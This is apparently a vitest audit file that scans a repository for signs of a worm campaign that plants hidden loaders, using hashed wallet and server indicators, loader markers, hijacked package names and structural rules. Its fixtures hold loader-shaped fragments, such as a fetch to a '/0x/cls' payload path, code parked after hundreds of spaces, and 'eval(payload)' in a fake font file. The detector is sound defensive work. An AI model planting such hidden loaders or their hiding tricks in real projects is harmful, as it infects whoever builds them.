/** @vitest-environment node */
/**
 * Repository-poisoning audit — fails if a tracked file carries the shape of a
 * worm-injected loader.
 *
 * WHY. The PolinRider campaign (reported 2026-11-26; 7,609 GitHub repositories)
 * uses a developer's stolen GitHub token to rewrite a commit they already made —
 * same author, message and date — and folds a loader into it. The loader hides
 * after hundreds of spaces at the end of a build-config line, in a Python file
 * that runs on import, in a fake font file, or in an editor auto-run task. It
 * reads its server address from a blockchain wallet, then downloads and runs a
 * stealer on whoever builds the project. Review does not catch it: the diff
 * looks like the developer's own commit and the payload is off-screen.
 *
 * WHERE IT RUNS. In the node pool (needs git + fs), registered in
 * scripts/vitest-node-suites.mjs so `npm test` collects it (the required
 * `build-and-test` check), and listed in `audit:oss-safety` (the required
 * `File hygiene check`). A poisoned branch therefore cannot merge, and this
 * repo publishes to npm and deploys only from merged code.
 *
 * WHAT IS DURABLE. The published wallets and server addresses rotate — treat
 * that list as a tripwire for the known waves only. The STRUCTURAL rules (hidden
 * code after whitespace, escape-obfuscated strings, auto-run files, fake fonts,
 * lockfile sources) describe how the loader must be shaped to work, and are what
 * should catch the next wave.
 *
 * Wallets and addresses are stored as SHA-256 of the lowercased token, never in
 * the clear: the repo does not have to carry live malware infrastructure
 * strings, and the list cannot match itself.
 *
 * File discovery is `git ls-files` — nested worktrees are never read.
 */
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

const REPO_ROOT = process.cwd();
const SELF = 'test/audits/supply-chain-poisoning.audit.test.ts';

const sha256 = (value: string): string => createHash('sha256').update(value).digest('hex');

/** SHA-256 of lowercased 40-hex Ethereum addresses used by the campaign. */
const WALLET_HASHES = new Set([
	'2dcd2a6b3f9971bce501b6125d062ba47b3310c3b542f42a7733c3af31304792',
	'0ef1ef52b1041e971be158cecf880cda6d49b8b37a6ccca8a939afc93a7787c8',
	'f3c17fe4d954284230f96ba48b1b7bb6465daf61bec68272cab05fc29f1ad453',
	'0c402d31e59836f29fed39c75759629bc9955cbe3365f4a6f94fe02f2a5f240f',
	'37a1eb91521fac92b81e66a6d69e523317df89507c2c3f84979ba96ffce013f4',
	'bb9edfca117ede340e6e797019710cf2aa0e850b9c4a13d254e2ec91c63c9f19',
	'6f8c6536e2b06ee9024fd099098b982f7b06c8ab35dad100b8d5fe6076fb930e',
	'eec55b657251796cfa019910937acd0bdec6acfc3f768972adfcce384fb8a1dd',
	'e9af0f1f87a4df7937d67e444cab83837a5fb9566fff0c952a597ef452a0cded',
]);

/** SHA-256 of the campaign's command-server IPv4 addresses. */
const IP_HASHES = new Set([
	'd3c64da22417f01f7778ab1a104f66430d84e1549b5f8c1b0ac217459a7078ee',
	'295f37fb032839bc73d0f98f4ad300d2285eba719cd583f6e06d7ced27315fe1',
	'4550c7046ad125c63bec14c6306c72fd9b5169ab6f95f5e3c8608459a8a35471',
	'6bbf330e1c19c06f7bcfa1d09a8275585858928786f67918c121be364e4f3ce0',
	'07fe79b99f257088649459c5a7fafc96d67daafc9637108b4097190966ed4b36',
	'2247bdf614491f385bb4867df1d522b7586a28863629a2106393d8d89353439c',
	'1ca8bd3eeb3b92d25d7221ab86cc01be8cc1a6afad61f3d4da693d771f183e58',
	'b5d90b6b218e962af78703c6f4792151fdc28ea680086c2cc6f0808a99fa4b33',
	'46613065a4182d3636ea7fcfe01f0da715faf7c93ad2c1ccdeb1495cde3cc6fc',
	'0efa1ae407e889d23a442daa61bfafbbce957b11081f821412568bd555e0baa0',
	'645139b371111c6351172c0ec85096332485f0ad42cb9e01c0ca6c3621759207',
]);

/** SHA-256 (case-sensitive) of the campaign's TRON addresses. */
const TRON_HASHES = new Set([
	'cec45105a1177d2948390aaabffcd4005cd5b6b658e9f3ed52feb78b2a34f035',
	'5e7168eb4f6c0afa0c616fadb2f6e7544a184d55938d0df7f18f61099322ae40',
	'da8cac99f23177a049f5d5bb43ea3eaddf9dc0fe756081aed5ecb090141fbaaa',
	'b5ca3a4075650aab6f3e91ed091bd784000264d97175e35059e624b1af44c688',
	'f9df600037b04a75c0371238608d22b5281027f2eec0f28c22f00977ed235124',
	'ccca7c1ed86f8414b899c8329f40e39833c3cbab544355692709fed65c52d543',
]);

/**
 * Plain-text markers, matched case-insensitively. Loader signatures, the
 * payload paths, the Ethereum RPC hosts the loader calls (legitimate services —
 * but nothing in this repo has a reason to call one), the fake hiring sites, and
 * the npm packages the campaign hijacked.
 */
const TEXT_MARKERS = [
	'helloipbot',
	'68656c6c6f6970626f742121',
	'/0x/cls',
	'/0x/ls',
	'_$_1e42',
	'rmcej%otb%',
	'cot%3t=shtp',
	'global.r=require',
	"global['!']",
	"global['_v']",
	'1rpc.io',
	'eth.drpc.org',
	'ethereum-rpc.publicnode.com',
	'eth-mainnet.public.blastapi.io',
	'eth.blockscout.com',
	'huntrole',
	'accurasofthire',
	'@adminide-stack/',
	'@pubngo-stack/',
	'@cdmbase/wiki-browser',
	'server-hemera-mongo',
	'itsa-utils',
	'itsa-jsext',
	'itsa-cli',
	'itsa-react-',
];

/** Code parked off-screen: a non-space, 150+ spaces/tabs, then more code. */
const HIDDEN_AFTER_WHITESPACE = /\S[ \t]{150,}\S/;
/** A string spelled out in escapes — how the loader hides its wallet address. */
const ESCAPE_RUN = /(?:\\u00[0-9a-fA-F]{2}){8,}|(?:\\x[0-9a-fA-F]{2}){12,}/;
/** Files that run without being asked: Python import hooks and pytest config. */
const AUTO_RUN_PATH = /(^|\/)(conftest\.py|sitecustomize\.py|usercustomize\.py|[^/]+\.pth)$/;
/** The campaign's fake-font payload names. */
const FAKE_FONT_PATH = /(^|\/)fa-solid[^/]*$|\.(lkf|llf)$/i;
const FONT_PATH = /\.woff2?$/i;
const MARKDOWN_PATH = /\.mdx?$/i;

const decodeEscapes = (text: string): string =>
	text
		.replace(/\\u00([0-9a-fA-F]{2})/g, (_, hex: string) => String.fromCharCode(parseInt(hex, 16)))
		.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex: string) => String.fromCharCode(parseInt(hex, 16)));

/** Every reason `path` with these bytes looks poisoned. Empty = clean. */
function findPoisoning(path: string, bytes: Buffer): string[] {
	const findings: string[] = [];
	if (AUTO_RUN_PATH.test(path)) findings.push('auto-run Python file');
	if (FAKE_FONT_PATH.test(path)) findings.push('fake-font payload name');
	if (FONT_PATH.test(path)) {
		const magic = bytes.subarray(0, 4).toString('latin1');
		if (magic !== 'wOF2' && magic !== 'wOFF') findings.push('font extension without font bytes');
		return findings;
	}
	// Other binaries (images, archives) are not text-scanned: the loader is source.
	if (bytes.subarray(0, 8192).includes(0)) return findings;

	const raw = bytes.toString('utf8');
	if (!MARKDOWN_PATH.test(path) && HIDDEN_AFTER_WHITESPACE.test(raw)) {
		findings.push('code hidden after 150+ whitespace characters');
	}
	if (ESCAPE_RUN.test(raw)) findings.push('escape-obfuscated string');
	if (/(^|\/)\.vscode\/tasks\.json$/.test(path) && /folderOpen/.test(raw)) {
		findings.push('editor task that runs when the folder is opened');
	}

	// Indicators are matched on the DECODED text, with defanged dots restored.
	const text = decodeEscapes(raw).replaceAll('[.]', '.');
	const lower = text.toLowerCase();
	for (const marker of TEXT_MARKERS) {
		if (lower.includes(marker)) findings.push(`known indicator: ${marker}`);
	}
	for (const token of lower.match(/(?<![0-9a-f])[0-9a-f]{40}(?![0-9a-f])/g) ?? []) {
		if (WALLET_HASHES.has(sha256(token))) findings.push('known campaign wallet address');
	}
	for (const token of text.match(/(?<![\d.])(?:\d{1,3}\.){3}\d{1,3}(?![\d.])/g) ?? []) {
		if (IP_HASHES.has(sha256(token))) findings.push('known campaign server address');
	}
	for (const token of text.match(/\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g) ?? []) {
		if (TRON_HASHES.has(sha256(token))) findings.push('known campaign TRON address');
	}
	return [...new Set(findings)];
}

/**
 * Lockfile entries that would install from somewhere other than the npm
 * registry or a workspace directory.
 */
function findForeignResolutions(lockfileJson: string): string[] {
	const packages = (JSON.parse(lockfileJson) as { packages?: Record<string, { resolved?: string }> }).packages;
	return Object.entries(packages ?? {})
		.filter(([, entry]) => {
			const resolved = entry.resolved;
			if (resolved === undefined) return false;
			if (resolved.startsWith('https://registry.npmjs.org/')) return false;
			// A workspace link: a plain relative directory, no scheme, no traversal.
			return !/^[A-Za-z0-9@._-]+(\/[A-Za-z0-9@._-]+)*$/.test(resolved) || resolved.includes('..');
		})
		.map(([name, entry]) => `${name} -> ${entry.resolved}`);
}

const trackedFiles = (...pathspec: string[]): string[] =>
	execFileSync('git', ['ls-files', '-z', ...pathspec], {
		cwd: REPO_ROOT,
		encoding: 'utf8',
		maxBuffer: 64 * 1024 * 1024,
	})
		.split('\0')
		.filter(Boolean);

describe('the scanner discriminates (known-bad vs known-good fixtures)', () => {
	// Indicators assembled from parts so this file never holds one in the clear.
	const wallet = ['a322e5f3d311d308', '0e6f0121063e9adc', '2490ef1a'].join('');
	const server = [95, 135, 181, 84].join('.');
	const scan = (path: string, text: string): string[] => findPoisoning(path, Buffer.from(text));

	it('passes ordinary source, long markdown tables and real fonts', () => {
		expect(scan('vite.config.ts', 'export default { plugins: [] };\n')).toEqual([]);
		expect(scan('docs/table.md', `| a |${' '.repeat(300)}| b |\n`)).toEqual([]);
		expect(scan('src/commit.ts', `const sha = '${'ab12'.repeat(10)}';\n`)).toEqual([]);
		expect(scan('src/addr.ts', "const dns = ['1.1.1.1', '8.8.8.8'];\n")).toEqual([]);
		expect(findPoisoning('public/fonts/a.woff2', Buffer.from('wOF2\0\0\0\0'))).toEqual([]);
	});

	it('flags code hidden after whitespace at the end of a config line', () => {
		const line = `module.exports = {};${' '.repeat(500)}global.i="A9-1";\n`;
		expect(scan('tailwind.config.js', line)).toContain('code hidden after 150+ whitespace characters');
	});

	it('flags a campaign wallet in any letter case, and when spelled in escapes', () => {
		expect(scan('a.js', `const S = "0x${wallet.toUpperCase()}";`)).toContain('known campaign wallet address');
		const escaped = [...`0x${wallet}`].map((ch) => `\\u00${ch.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
		const findings = scan('a.js', `const S = "${escaped}";`);
		expect(findings).toContain('escape-obfuscated string');
		expect(findings).toContain('known campaign wallet address');
	});

	it('flags a campaign server address, plain or defanged', () => {
		expect(scan('a.py', `HOST = "${server}"`)).toContain('known campaign server address');
		expect(scan('notes.txt', server.replaceAll('.', '[.]'))).toContain('known campaign server address');
	});

	it('flags loader markers, payload paths and hijacked packages', () => {
		expect(scan('a.js', 'fetch(`http://${ip}:443/0x/cls`)')).toContain('known indicator: /0x/cls');
		expect(scan('a.js', 'global.r=require;')).toContain('known indicator: global.r=require');
		expect(scan('package.json', '{"dependencies":{"@adminide-stack/utils":"1.0.0"}}')).toContain('known indicator: @adminide-stack/');
	});

	it('flags auto-run files, folder-open tasks and fake fonts', () => {
		expect(scan('tests/conftest.py', 'import os\n')).toContain('auto-run Python file');
		expect(scan('.vscode/tasks.json', '{"runOptions":{"runOn":"folderOpen"}}')).toContain(
			'editor task that runs when the folder is opened',
		);
		expect(scan('public/fonts/fa-solid-400.woff2', 'eval(payload)')).toEqual([
			'fake-font payload name',
			'font extension without font bytes',
		]);
	});

	it('flags a lockfile entry resolved outside the registry and workspaces', () => {
		const lock = (resolved: string): string => JSON.stringify({ packages: { 'node_modules/x': { resolved } } });
		expect(findForeignResolutions(lock('https://registry.npmjs.org/x/-/x-1.0.0.tgz'))).toEqual([]);
		expect(findForeignResolutions(lock('packages/dns-checks'))).toEqual([]);
		expect(findForeignResolutions(lock('file:vendor/x-1.0.0.tgz'))).toHaveLength(1);
		expect(findForeignResolutions(lock('https://example.com/x.tgz'))).toHaveLength(1);
		expect(findForeignResolutions(lock('git+ssh://git@github.com/a/b.git#abc'))).toHaveLength(1);
		expect(findForeignResolutions(lock('../outside'))).toHaveLength(1);
	});
});

describe('no tracked file is poisoned', () => {
	const files = trackedFiles().filter((file) => file !== SELF);

	it('sweeps the whole tracked tree, including the build configs a loader targets', () => {
		// Floor catches a cwd/spawn collapse only; measured 1,928 on 2026-11-26.
		expect(files.length).toBeGreaterThan(1_000);
		for (const path of ['tsup.config.ts', 'eslint.config.mjs', 'package.json', 'src/index.ts', 'packages/dns-checks/package.json']) {
			expect(files, `${path} must be in the swept set`).toContain(path);
		}
	});

	it('finds no loader shape or campaign indicator', () => {
		const offenders: string[] = [];
		for (const file of files) {
			let bytes: Buffer;
			try {
				bytes = readFileSync(join(REPO_ROOT, file));
			} catch {
				continue; // tracked but absent from the working tree (sparse/mid-rebase)
			}
			for (const finding of findPoisoning(file, bytes)) offenders.push(`${file}: ${finding}`);
		}
		expect(offenders, `Possible repository poisoning — do NOT build or deploy; inspect each file:\n${offenders.join('\n')}`).toEqual([]);
	});

	it('every lockfile installs only from the registry or workspaces', () => {
		const lockfiles = trackedFiles('package-lock.json', '**/package-lock.json');
		expect(lockfiles).toContain('package-lock.json');
		const offenders = lockfiles.flatMap((lockfile) =>
			findForeignResolutions(readFileSync(join(REPO_ROOT, lockfile), 'utf8')).map((hit) => `${lockfile}: ${hit}`),
		);
		expect(offenders, `Unexpected install source:\n${offenders.join('\n')}`).toEqual([]);
	});
});
